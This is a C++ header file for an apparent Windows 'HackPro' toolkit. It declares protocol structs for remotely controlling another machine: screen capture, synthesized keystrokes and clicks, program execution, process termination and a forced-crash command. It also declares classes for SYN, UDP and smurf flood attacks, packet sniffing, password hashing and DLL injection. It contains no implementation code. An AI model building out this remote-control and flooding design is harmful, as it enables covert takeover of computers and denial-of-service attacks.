#ifndef PAPAHEAD_H
#define PAPAHEAD_H
//#include "stdafx.h"
//#include "HackPro.h"
#pragma message ("PapaHead: included")
//sychronization object name
#define HACK_MUTEX "HackClientMutex"
//===================================================================================
#define CALLBACK_REGVAL 1		//registry entry callback function index 
#define CALLBACK_WNDFILLINFO 2	//Getting the information about top windows on the system
#define CALLBACK_WNDFN 3		//for performing some window functions (hide/unhide/close/enable/etc)
#define CALLBACK_SYSINFO 4		//for getting system information
#define CALLBACK_SYSCTRL 5		//for System Control
#define CALLBACK_GETDESKTOP 9	//For getting Bmp of an desktop
#define	CALLBACK_CAPTUREWINDOW 11 //for getting bitmap of window
//===================================================================================

#define FUNCTION_REGVAL 1		//registry entry callback function index 
#define FUNCTION_WNDFILLINFO 2	//Getting the information about top windows on the system
#define FUNCTION_WNDFN 3		//for performing some window functions (hide/unhide/close/enable/etc)
#define FUNCTION_SYSINFO 4		//for getting system information
#define FUNCTION_SYSCTRL 5		//for System Control
#define FUNCTION_MOVEMOUSE 6	//for moving mouse to position i,j  
#define FUNCTION_CLICKMOUSE 7	//for clicking mouse to position i,j
#define FUNCTION_DCLICKMOUSE 8	//for double clicking a mouse at position i,j
#define FUNCTION_GETDESKTOP	9	//for getting bitmap of window
#define FUNCTION_TYPEKEY 10		//for typing keybord to a specific key (WORD)
//===================================================================================
#define WNDFN_HIDE	1
#define WNDFN_UNHIDE 2
#define WNDFN_CLOSE 3
#define WNDFN_SETTEXT 4
#define WNDFN_ENABLE 5
#define WNDFN_DISABLE 6
//===================================================================================
//===================================================================================
#define SYS_SHUTDOWN 1
#define SYS_LOGOFF 2
#define SYS_RESTART 3
#define SYS_BOSD 4
#define SYS_LOCK 5
#define SYS_EXEC 6
#define SYS_SETPRIORITY 7
#define SYS_TERMINATE 8

struct SysInfoArgv //header of system infromation request
{
	unsigned long This;
	unsigned int  size;
};

struct MyEnumArgv
{
	unsigned long This;
	unsigned long Hwnd;
	unsigned long Parent;
};

typedef struct __WndItem
{
	HWND Hwnd;
	char Text[255];
	char ClassName[64];
	WINDOWINFO  WndInfo;	
}WndItem ,*pWndItem;

typedef struct __WndNode
{
	HWND Hwnd;
	char Text[255];
	char ClassName[64];
	WINDOWINFO  WndInfo;
	__WndNode* Parent;
	CArray<__WndNode*,__WndNode*> Children;
}WNode,*PWNode;

typedef struct __FetchBuff
{
	int function;
	int datasize;
	int callback;	
}Fetch,PFetch;

struct WndFunctionArgv
{
		unsigned long Hwnd;
		char str[20];
		int fn;
};

//============================SysCtrl============
struct ProcInfo		//Information of Process
{
	DWORD Pid;
	LONG Pri;
	DWORD ThreadCount;
	char szExe[30] ;
};

struct SysCtrlInfo
{
	unsigned long This;  //callback value (id  of caller)
	BOOL isSucceed;		//is Request succeed 
	int lenPinfo;		//length of pinfo array;

};

struct SysCtrlReq	//Format of request  for any system Control Function
{
	unsigned long This; //callback value (id  of caller)
	int Cmd;	//Command to be executed
	LONG pri;
	DWORD Pid; //Required if request is about process Manupulation can be null
	char FileName[512]; //Required if some file to be executed
	char CmdLine[512];	//Required if some file to be executed
	char dir[512];		//Required if some file to be executed
	char verb[10];		//Required if some file to be executed
	int CmdShow;		//Required if some file to be executed

};

//============================
struct GetWndBmpReq //Format for request for the bitmap of any window
{
	unsigned long This; //callback value
	unsigned long HWnd; //Handle to the Window
};

struct WndBmp
{
	unsigned long This; //callback value(caller ID)
	int success; //is bitmap  retrived or not
	int width;   //width of window (or bitmap)
	int height;	 //height of window (or bitmap)
};

struct SynthInputReq //Format of function SynthInput
{
  unsigned long This;	//callback value(caller ID)
  UINT   message;		//type of message
  WPARAM wParam;		//wparam
  LPARAM lParam;		//lparam
  int MsgType;			//Type of Message KeyBoard or Mouse
};

struct SynthInputReply //Return of  function SynthInput
{
	unsigned long This;	//callback value(caller ID)
	int success;		//return value sendinput function
	/*
	The function returns the number of events that it successfully inserted into 
	the keyboard or	mouse input stream. If the function returns zero, the input
	was already blocked by another thread.
	*/
};

//===================================================================================
class AboutDlg;
class CCmdOut;
class CExSheet;
class CHackProApp;
class CHackProModule;
class CHackProDlg;
class CNetSocket;
class CPwdHash;
class CRawPacketDlg;
class RegdataTree;
class CRegConfigDlg;
class CSmurfDlg;
class CStack;
class CWndList;
class CWndTree;
class InputIP;
class ItemData;
class Level;
class MacAddrDlg;
class PortScan;
class PortScanSip;
class Tip;
class CHackClient;
class SysInfo;
class SysCtrl;
class CDesktop;
class GenericPortScanner;
class CUdpAttackDlg;
class CSynAttackDlg;
class PacketSniffer;
class CNetInfo;
class CNetStat;
class CConnectionTable;
class CBreachDetector;
class CRevEngineer;
class DllInjector;

/**************************************************************************
		DATA STRUCTURE RELATED TO DLL Injector
****************************************************************************/
typedef HINSTANCE (WINAPI *pLoadLib_t) (CHAR *);
typedef HINSTANCE (WINAPI *pGetProcAddr_t) (HINSTANCE, CHAR *);
typedef HINSTANCE (WINAPI *pFreeLib_t) (HINSTANCE);
typedef struct _remote_info {
    pLoadLib_t      pLoadLibrary;
    pGetProcAddr_t pGetProcAddress;
    pFreeLib_t     pFreeLibrary;
    CHAR  szDllName[261];
    CHAR  szProcName[261];
 } REMOTE_INFO;
typedef int (*pOnLoad_t)(void);
/**************************************************************************
		DATA STRUCTURE RELATED TO Browse of CDialogs (used by CHackProDlg and CExSheet)
****************************************************************************/
struct BrowseObj
{
	CDialog* page;
	CString Path;
};
//----------------------------------------------------------------------------

/**************************************************************************
		DATA STRUCTURE RELATED TO PortScanning				
****************************************************************************/
struct ScanResult
{
	CString IP;	//IP of computer
	int Port;	//Port To be Scaned 
	bool Result;// Result of Scan (True/False)
	GenericPortScanner* This;//Pointer To the this class
};
struct ScanInput 
{
	GenericPortScanner* This;//Pointer To the this class
	int InputCount;			 //Total Objects to scan
	ScanResult* Input;		//Pointer to objects
};

//===================================================================================
		/**************************************************************************
		        DATA STRUCTURE RELATED TO RAWPACKET SENDING AND RELATED
		****************************************************************************/


struct PacketParam
{
	int ttl;
	unsigned short port;
	unsigned long source;
	unsigned long destination;
};

struct RawParam
{
	CRawPacketDlg* This;
	int Type;	//Type of packet 1:ICMP ,2:TCP 3:UDP
	int count;	//no. of packet to send
	unsigned long Delay;
	PacketParam pktParam;
	unsigned char Flag;
	unsigned short srcPort;
	unsigned short destPort;
	unsigned short packetsize;

};
struct PortData
{
	int port;
	char* Des;
};
//=============Some Imaportant Structures=====================
/******************************IP Header**********************
First 32bit register
	version			=>4 bit		value indicating version
	ihl				=>4 bit		Length of IP header in 32bit Words
	type_service	=>8 bit		This field allows for precedence of traffic and for the insertion of delay if requiered
	tot_len			=>16 bit	Total Lenght of packet in octets(e.g. if size is 32 byte value should be 32/4 or 8) Note: Maximum size of packet is 64K
Second 32bit register
	id				=>16 bit	Identification of packet
	frag_off		=>16 bit	First 3 bit assigned to flag and rest 13 bit to the fragmet offset
Third 32bit register
	ttl				=>8 bit		Time to live measured in Second 
	Protocol		=>8 bit		This field indicates the next protocol header to follow the ip header
								1:ICMP	2:IGMP	6:TCP	8:EGP	17:UDP
	check			=>16bit		Mathematical checksum that is required at each router as the header the header information changes
Fourth 32bit register
	Source			=>32bit		Source IP Address
Fifth 32bit Register
	Destination		=>32bit		Destination IP Address
**************************************************************/
typedef struct __iphdr
{
    unsigned char  ihl:4;              // header-len in qwords.
	unsigned char  version:4;          // IP version. (IPv4)
    unsigned char  type_service;       // type of service.
    unsigned short tot_len;            // total packet len.
    unsigned short id;                 // ID to tag packet.
    unsigned short frag_off;           // fragment offset.
    unsigned char  ttl;                // time to live.
    unsigned char  protocol;           // IP protocol.
    unsigned short check;              // internet checksum.
    unsigned long  source;             // source IP.
    unsigned long  destination;        // destination IP.
 }IP_HEADER;

//========================ICMP HEADER=======================
#define ICMP_ECHOREPLY      0
#define ICMP_DEST_UNREACH   3
#define ICMP_SOURCE_QUENCH	4
#define ICMP_REDIRECT		5
#define ICMP_ECHO           8
#define ICMP_TIME_EXCEEDED	11


typedef struct __icmphdr
{
	unsigned char  type;            // Message type.
	unsigned char  code;			// Message type sub code.
	unsigned short checksum;        // Internet checksum.
	union 
	{
		struct 
		{
				unsigned short id;          // ID to tag the packet.
				unsigned short sequence;    // Sequence number.
			
		} echo;							// Echo datagram.
	} un;

}ICMP_HEADER;

//==========================================================
//===========================TCPHEADER======================
#define TCPFLAG_URG 0x20
#define TCPFLAG_ACK 0x10
#define TCPFLAG_PSH 0x08
#define TCPFLAG_RST 0x04
#define TCPFLAG_SYN 0x02
#define TCPFLAG_FYN 0x01
typedef struct __TCPHeader
{
	unsigned short	SourcePort;
	unsigned short	DestinationPort;
	unsigned long	SequenceNumber;
	unsigned long	AcknowledgeNumber;
	unsigned char	DataOffset;		
	unsigned char	Flags;
	unsigned short	Windows;
	unsigned short	Checksum;
	unsigned short	UrgentPointer;
} TCP_HEADER;

//==========================================================
typedef struct __UDPHeader
{
	unsigned short	SourcePort;
	unsigned short	DestinationPort;
	unsigned short	Length;
	unsigned short	Checksum;
} UDP_HEADER;
//==========================================================

//==========================================================

//====================================================================================

/*
#include "resource.h"
#include "regdatatree.h"
#include "Tip.h"
#include "stack.h"
#include "RegConfigDlg.h"
#include "HackProdlg.h"
#include "MacAddrDlg.h"
#include "PortScan.h"
#include "PortScanSip.h"
#include "smurfdlg.h"
#include "Rawpacketdlg.h"
#include "PwdHash.h"
#include "afxcmn.h"
#include "aboutdlg.h"
#include "WndList.h"
#include "WndTree.h"
#include "stdafx.h"
#include "WndTree.h"
#include "WndList.h"
#include "Hackclient.h"
#include "Exsheet.h"

//=======================================================================================
*/
#endif